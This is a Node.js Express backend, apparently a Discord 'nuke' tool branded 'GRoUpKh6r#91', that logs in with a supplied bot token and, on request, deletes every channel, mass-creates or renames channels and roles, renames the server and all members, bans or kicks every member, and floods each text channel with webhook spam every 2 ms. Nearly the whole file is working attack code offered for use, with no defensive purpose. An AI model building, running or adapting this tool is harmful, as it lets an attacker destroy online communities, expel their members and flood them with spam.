// language: JavaScript, file: server.js, target: Node.js Backend
const express = require('express');
const { Client, GatewayIntentBits } = require('discord.js');
const path = require('path');

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

const activeSpamMap = new Map();

app.post('/api/execute', async (req, res) => {
    let { token, guildId, targetName, webhookName, spamMessage, action } = req.body;
    
    if (!token || !guildId) {
        return res.status(400).json({ success: false, error: 'Token and Guild ID are required.' });
    }

    guildId = guildId.trim().replace(/\D/g, '').slice(0, 19);

    const client = new Client({ 
        intents: [
            GatewayIntentBits.Guilds, 
            GatewayIntentBits.GuildMembers, 
            GatewayIntentBits.GuildMessages 
        ] 
    });

    try {
        await client.login(token);
        const guild = await client.guilds.fetch(guildId);

        // دالة مساعدة لزرع الويبهوكات والسبام الفوري
        async function spawnWebhooksAndSpam() {
            const channels = guild.channels.cache.filter(c => c.type === 0); // الرومات النصية
            for (const [id, ch] of channels) {
                let webhook = await ch.createWebhook({ name: webhookName || 'GRoUpKh6r-Spam' }).catch(() => {});
                if (webhook) {
                    let spaming = setInterval(async () => {
                        await webhook.send(spamMessage || '@everyone https://discord.gg/vanta-nuke-x GRoUpKh6r#91 ON TOP').catch(() => {});
                    }, 2); // سرعة فائقة جداً
                    activeSpamMap.set(ch.id, spaming);
                }
            }
        }

        if (action === 'create_channels') {
            for (let i = 0; i < 40; i++) {
                await guild.channels.create({ name: targetName }).catch(() => {});
            }
            await spawnWebhooksAndSpam();
            res.json({ success: true, message: `[GRoUpKh6r#91] Channels created and spam webhooks deployed!` });

        } else if (action === 'delete_channels') {
            const deletePromises = [];
            guild.channels.cache.forEach(ch => deletePromises.push(ch.delete().catch(() => {})));
            await Promise.all(deletePromises);
            res.json({ success: true, message: `[GRoUpKh6r#91] All channels deleted successfully.` });

        } else if (action === 'rename_channels') {
            const renamePromises = [];
            guild.channels.cache.forEach(ch => renamePromises.push(ch.setName(targetName).catch(() => {})));
            await Promise.all(renamePromises);
            // تفعيل الويبهوكات والسبام تلقائياً حتى عند تعديل الأسماء
            await spawnWebhooksAndSpam();
            res.json({ success: true, message: `[GRoUpKh6r#91] Channels renamed and instant spam triggered!` });

        } else if (action === 'create_roles') {
            for (let i = 0; i < 30; i++) {
                await guild.roles.create({ name: targetName }).catch(() => {});
            }
            res.json({ success: true, message: `[GRoUpKh6r#91] Roles created successfully.` });

        } else if (action === 'delete_roles') {
            guild.roles.cache.forEach(role => {
                if (role.editable && role.name !== '@everyone') role.delete().catch(() => {});
            });
            res.json({ success: true, message: `[GRoUpKh6r#91] Roles deleted successfully.` });

        } else if (action === 'rename_roles') {
            guild.roles.cache.forEach(role => {
                if (role.editable && role.name !== '@everyone') role.setName(targetName).catch(() => {});
            });
            res.json({ success: true, message: `[GRoUpKh6r#91] Roles renamed successfully.` });

        } else if (action === 'rename_server') {
            await guild.setName(targetName).catch(() => {});
            res.json({ success: true, message: `[GRoUpKh6r#91] Server renamed to ${targetName}.` });

        } else if (action === 'rename_members') {
            const members = await guild.members.fetch();
            members.forEach(m => m.setNickname(targetName).catch(() => {}));
            res.json({ success: true, message: `[GRoUpKh6r#91] All members renamed!` });

        } else if (action === 'start_webhook_spam') {
            await spawnWebhooksAndSpam();
            res.json({ success: true, message: `[GRoUpKh6r#91] Infinite webhook spam activated across all channels!` });

        } else if (action === 'stop_all_spam') {
            activeSpamMap.forEach((intervalId) => clearInterval(intervalId));
            activeSpamMap.clear();
            res.json({ success: true, message: `[GRoUpKh6r#91] All spam loops terminated.` });

        } else if (action === 'ban_all') {
            const members = await guild.members.fetch();
            members.forEach(m => m.ban().catch(() => {}));
            res.json({ success: true, message: `[GRoUpKh6r#91] Banned all members.` });

        } else if (action === 'kick_all') {
            const members = await guild.members.fetch();
            members.forEach(m => m.kick().catch(() => {}));
            res.json({ success: true, message: `[GRoUpKh6r#91] Kicked all members.` });
        }

    } catch (err) {
        res.status(500).json({ success: false, error: err.message });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`[7bl] GRoUpKh6r#91 Engine online on port ${PORT}`);
});
